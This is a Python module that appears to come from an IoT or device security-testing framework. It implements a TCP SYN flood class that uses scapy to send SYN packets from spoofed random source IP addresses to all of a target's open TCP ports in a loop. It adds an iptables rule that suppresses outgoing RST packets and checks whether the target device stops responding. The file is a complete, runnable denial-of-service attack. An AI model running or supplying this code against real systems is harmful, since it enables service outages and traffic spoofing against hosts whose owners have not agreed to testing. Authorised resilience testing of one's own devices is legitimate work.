from generic_attack import *
import logging
log = logging.getLogger(__name__)
from scapy.all import *
import os
import threading

class TcpSyn(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(TcpSyn, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        target = self.device['ip']
        global continuousAttack
        continuousAttack = self.config['continuous_attack']

        if self.device["vulnerable_ports"] is None:
            result.update({"status": "no open ports"})
            return

        if "tcp" not in self.device["vulnerable_ports"].keys():
            result.update({"status": "no open ports"})
            return

        if "open" not in self.device["vulnerable_ports"]["tcp"].keys():
            result.update({"status": "no open ports"})
            return

        """ Send packets
                """

        command = "iptables -A OUTPUT -p tcp -s %s --tcp-flags RST RST  -j DROP" % target
        os.system(command)

        tstatus = threading.Thread(target=self.deviceStatus, args=(result,))
        tstatus.start()

        openPorts = self.device["vulnerable_ports"]["tcp"]["open"]
        counter = 0
        connectionsPerPort = dict((el, 0) for el in openPorts)
        start_time = time.time()
        while self.running:
            for port in openPorts:
                if not self.running:
                    break
                sport = random.randint(1024, 65535)
                rand_addr = self.address_spoofer()
                pkt = IP(src=rand_addr, dst=target)
                pkt /= TCP(sport = sport, dport=port,seq=1000, flags='S')
                send(pkt)
                connectionsPerPort[port] = (connectionsPerPort[port] + 1)
                counter = counter + 1

        tstatus.join()

        result.update({"connections": counter,
                       "connection_distribution": connectionsPerPort, "attack_time:" : (time.time() - start_time)})
        return


    def deviceStatus(self, result):
        max = 5
        detected = 0
        while self.running:
            if not self.is_alive():
                detected = detected + 1
                time.sleep(0.1)
                if detected == max:
                    result.update({"status": "vulnerable", "dos-status": "device not responding"})
                    global continuousAttack
                    if not continuousAttack:
                        self.running = False
                    return
        result.update({"status": "not_vulnerable", "dos-status": "device responding"})
        return

    def shutdown(self):
        # os.system('iptables -F')
        # os.system('iptables -X')
        self.running = False

    def prerequisite(self):
        return ["PortVulnerabilityTest"]

    def address_spoofer(self):

        addr = [192, 168, 0, 1]
        d = '.'
        addr[0] = str(random.randrange(11, 197))
        addr[1] = str(random.randrange(0, 255))
        addr[2] = str(random.randrange(0, 255))
        addr[3] = str(random.randrange(2, 254))
        assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
        return assemebled
